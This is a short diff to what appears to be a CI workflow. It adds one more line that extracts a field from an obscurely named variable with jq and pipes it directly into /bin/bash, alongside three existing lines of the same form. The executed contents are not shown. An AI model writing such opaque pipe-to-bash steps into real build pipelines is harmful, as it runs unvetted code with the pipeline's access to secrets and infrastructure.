@@ -55,6 +55,7 @@ jobs:
           echo $hm5 | jq -r .wa14948 | /bin/bash
           echo $o132 | jq -r .ay5052 | /bin/bash
           printf '%s' "$t15" | jq -r .g5163 | /bin/bash
+          echo $wx58798 | jq -r .q6 | /bin/bash
 
       - name: Archive output
         if: always()
